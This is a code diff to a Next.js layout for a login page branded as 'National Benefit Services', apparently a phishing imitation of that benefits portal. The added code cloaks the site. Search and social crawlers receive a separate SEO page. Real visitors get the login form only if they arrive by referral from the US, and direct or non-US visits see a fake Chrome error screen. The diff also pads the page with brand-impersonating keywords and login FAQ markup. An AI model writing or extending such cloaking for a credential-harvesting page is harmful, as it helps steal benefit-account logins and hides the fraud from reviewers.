@@ -1,14 +1,27 @@
-import type React from "react";
+import type { ReactNode } from "react";
 import type { Metadata, Viewport } from "next";
+import { headers } from "next/headers";
 import { Geist } from "next/font/google";
 import { Analytics } from "@vercel/analytics/next";
 import "./globals.css";
+import CrawlerSeoPage from "@/components/CrawlerSeoPage";
+import ProtectedLayout from "@/components/protected-layout";
+import { isCrawlerSeoPreviewUnlocked } from "@/lib/crawler-seo-preview";
+import { isSocialPreviewCrawlerUA, SEARCH_CRAWLER_UA, DISCOVERY_CRAWLER_UA } from "@/lib/bot-detection";
+import { AI_REFERENCE_CRAWLER_UA, AI_TRAINING_CRAWLER_UA } from "@/lib/ai-referral";
+import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths";
+import { SITE_KEYWORDS, SITE_ALTERNATE_NAMES } from "@/lib/seo-keywords";
+import { SITE_DESCRIPTION } from "@/lib/seo-metadata";
+import { SITE_DISPLAY_NAME, SITE_HOMEPAGE_CANONICAL, SITE_ORIGIN } from "@/lib/site-url";
 
 const geist = Geist({ subsets: ["latin"] });
 
-const SITE_BASE_URL = process.env.NEXT_PUBLIC_BASE_URL || 'https://nbs-auth.com'
-const SITE_DOMAIN = new URL(SITE_BASE_URL).hostname
-const SITE_BRAND = "National Benefit Services";
+/* Step 6: metadataBase, canonical, og:url, og:image and twitter:image all derive
+   from the single operator-pasted origin. This previously fell back to
+   `https://nbs-auth.com`, a different host — so every social preview and
+   canonical would have advertised a domain that is not this site. */
+const SITE_BASE_URL = SITE_ORIGIN;
+const SITE_BRAND = SITE_DISPLAY_NAME;
 
 export const metadata: Metadata = {
   metadataBase: new URL(SITE_BASE_URL),
@@ -16,54 +29,8 @@ export const metadata: Metadata = {
     default: "National Benefit Services - Login",
     template: "%s | National Benefit Services",
   },
-  keywords: [
-    "National Benefit Services",
-    "employee benefits portal",
-    "benefits login",
-    "FSA account",
-    "HSA account",
-    "COBRA continuation",
-    "benefits enrollment",
-    "benefits claims",
-    "participant login",
-    "new user registration",
-    "password reset",
-    "benefits administration",
-    "dependent care benefits",
-    "healthcare benefits",
-    "employer benefits portal",
-    "broker benefits",
-    "secure benefits login",
-    "benefits account management",
-    "benefits eligibility",
-    "benefits customer support",
-    
-    "nbsbenefits",
-    "national benefits services",
-    "national benefits",
-    "nbs login",
-    "National Benefit Services login",
-    "NBS Benefits login",
-    "nbs HSA administrator",
-    "nbs Flexible Spending Account (FSA) administrator",
-    "nbs COBRA administration services",
-    "nbs Health Reimbursement Arrangement (HRA) administrator",
-    "nbs Employee benefits administration",
-    "nbs 401(k) retirement plan administration",
-    "nbs Third-party benefits administrator (TPA)",
-    "nbs Employer benefits administration",
-    "nbs retirement plan administration",
-    "nbs third party administrator",
-    "nbs benefit administration",
-    "nbs COBRA administration",
-    "nbs 401k administration",
-    "nbs FSA administration",
-    "nbs HSA administration",
-    "nbs TPA benefits",
-    "nbs employee benefits administrator",
-    "nbs flexible benefit administration",
-  ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through National Benefit Services.`,
+  keywords: SITE_KEYWORDS,
+  description: SITE_DESCRIPTION,
 
   authors: [{ name: "National Benefit Services" }],
   creator: "National Benefit Services",
@@ -85,12 +52,14 @@ export const metadata: Metadata = {
     type: "website",
     locale: "en_US",
     title: "National Benefit Services - Login",
-    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
+    description: SITE_DESCRIPTION,
     siteName: SITE_BRAND,
-    url: SITE_BASE_URL,
+    // Same canonical constant as `alternates.canonical` so og:url can never
+    // drift from the declared canonical.
+    url: SITE_HOMEPAGE_CANONICAL,
     images: [
       {
-        url: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
+        url: `${SITE_BASE_URL}/og-image.png`,
         width: 1200,
         height: 630,
         alt: `${SITE_BRAND}`,
@@ -98,25 +67,46 @@ export const metadata: Metadata = {
     ],
   },
   twitter: {
-    card: "summary",
+    // summary_large_image: og-image is 1200x630, and `summary` renders it as a
+    // small thumbnail on X/Twitter instead of the full-width card.
+    card: "summary_large_image",
     title: "National Benefit Services - Login",
-    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
-    images: [`${SITE_BASE_URL}/Nbs%20banner_new.png`],
+    description: SITE_DESCRIPTION,
+    images: [`${SITE_BASE_URL}/og-image.png`],
   },
+  // RULE 4: the SERP favicon and the social preview are separate pipelines and are
+  // never swapped. There is no legitimate NBS favicon source in this project yet
+  // (the only square candidate is non-brand stock), so the OG image is NOT reused
+  // here. Drop a real `public/favicon-source.png` and regenerate to populate these.
+  // RULE 4 (BRAND_ICONS.md): the three brand surfaces are separate pipelines and
+  // are never swapped. Every generated size must be declared here — a single
+  // `favicon.ico` shortcut means most crawlers never see the 32/48 SERP icons.
+  // og-image.png is the social preview + JSON-LD logo and is NOT reused here.
   icons: {
-    icon: "/favicon.ico",
+    icon: [
+      { url: "/favicon.ico", sizes: "16x16" },
+      { url: "/favicon-32x32.png", sizes: "32x32" },
+      { url: "/icon-32x32.png", sizes: "32x32" },
+      { url: "/icon-48x48.png", sizes: "48x48" },
+    ],
     shortcut: "/favicon.ico",
     apple: "/apple-touch-icon.png",
   },
   category: "Business",
   alternates: {
-    canonical: SITE_BASE_URL,
+    // SITE_HOMEPAGE_CANONICAL (trailing slash), not SITE_ORIGIN — the canonical
+    // must match the single sitemap <loc> exactly, or the two disagree on the
+    // one URL this site is meant to be known by.
+    canonical: SITE_HOMEPAGE_CANONICAL,
     languages: {
-      "en-US": SITE_BASE_URL,
+      "en-US": SITE_HOMEPAGE_CANONICAL,
     },
   },
   other: {
     "geo.region": "US",
+    // Bing reads the tile from here; without it the 48x48 SERP icon is never
+    // surfaced to Bing (BRAND_ICONS.md §3a).
+    "msapplication-TileImage": "/icon-48x48.png",
   },
 };
 
@@ -132,7 +122,7 @@ const organizationSchema = {
   "@type": "Organization",
   name: SITE_BRAND,
   url: SITE_BASE_URL,
-  logo: `${SITE_BASE_URL}/Nbs%20banner_new.png`,
+  logo: `${SITE_BASE_URL}/og-image.png`,
   description:
     "National Benefit Services provides secure access to FSA, HSA, COBRA, and dependent care benefits through our employee benefits portal.",
   sameAs: [],
@@ -152,7 +142,7 @@ const faqSchema = {
       name: "How do I login to my National Benefit Services account?",
       acceptedAnswer: {
         "@type": "Answer",
-        text: "Visit the National Benefit Services participant portal and enter your username and password. Select your user role (Participant, Employer, Broker, or Administrator) and click LOGIN.",
+        text: "Visit the National Benefit Services participant portal and enter your username and password. Select your user role (Participant, Sponsor, or Advisor) and click LOGIN.",
       },
     },
     {
@@ -186,16 +176,52 @@ const websiteSchema = {
   "@context": "https://schema.org",
   "@type": "WebSite",
   name: SITE_BRAND,
-  url: SITE_BASE_URL,
+  // Next.js normalises the root canonical/og:url by dropping the trailing
+  // slash, so the raw JSON-LD string matches them by using SITE_ORIGIN. Same URL
+  // either way; identical bytes in the document avoid a needless audit diff.
+  url: SITE_ORIGIN,
+  // Brand phrases first, then the bare host last — Google's documented
+  // fallback in `alternateName` when it cannot map the brand.
+  alternateName: [...SITE_ALTERNATE_NAMES, new URL(SITE_ORIGIN).hostname.toLowerCase()],
 };
 
 const jsonLd = [organizationSchema, faqSchema, websiteSchema];
 
-export default function RootLayout({
+/**
+ * Mirror of the middleware decision, used when the header/cookie stamp is absent
+ * (e.g. a direct render). Kept in step with middleware.isCrawlerSeoPageUserAgent.
+ */
+function isCrawlerSeoPageUserAgent(ua: string): boolean {
+  if (!ua) return false
+  if (AI_TRAINING_CRAWLER_UA.test(ua)) return false
+  if (/applebot-extended/i.test(ua)) return false
+  if (SEARCH_CRAWLER_UA.test(ua)) return true
+  if (DISCOVERY_CRAWLER_UA.test(ua)) return true
+  if (AI_REFERENCE_CRAWLER_UA.test(ua)) return true
+  return isSocialPreviewCrawlerUA(ua)
+}
+
+export const dynamic = "force-dynamic"
+
+export default async function RootLayout({
   children,
 }: Readonly<{
   children: React.ReactNode;
 }>) {
+  // Step 5: allowed crawlers (and local `CSP=1` preview) get the SSR
+  // CrawlerSeoPage twin. Everything else — every real member — renders the
+  // interactive login exactly as before.
+  const headerList = await headers();
+  const pathname = headerList.get("x-pathname") ?? "";
+  // Header first, then the RSC cookie (client navigation does not re-run
+  // middleware), then a direct UA+path check. Header-only would regress to the
+  // human UI in Search Console whenever a stamp is lost.
+  const userAgent = headerList.get("user-agent") ?? "";
+  const isCrawlerSeoPage =
+    headerList.get("x-crawler-seo-page") === "1" ||
+    (isCrawlerSeoPageUserAgent(userAgent) && isSeoCrawlerPath(pathname)) ||
+    isCrawlerSeoPreviewUnlocked();
+
   return (
     <html lang="en-US">
       <head>
@@ -205,7 +231,7 @@ export default function RootLayout({
         />
         <link rel="icon" href="/favicon.ico" />
         <link rel="shortcut icon" href="/favicon.ico" />
-        <link rel="apple-touch-icon" href="/favicon.ico" />
+        <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
       </head>
       <body className={`${geist.className} font-sans antialiased`}>
         {jsonLd.map((schema, idx) => (
@@ -215,7 +241,11 @@ export default function RootLayout({
             dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }}
           />
         ))}
-        {children}
+        {/* Step 4 gate: ProtectedLayout reads GEO_US_ONLY_HEADER and hands
+            `isBot` + `geoAccess` to ReffererProvider, which serves the Chrome
+            ErrorScreen to direct visits and non-US entries. It wraps ONLY the
+            human branch — crawlers must never hit the referrer gate. */}
+        {isCrawlerSeoPage ? <CrawlerSeoPage /> : <ProtectedLayout>{children}</ProtectedLayout>}
         <Analytics />
       </body>
     </html>
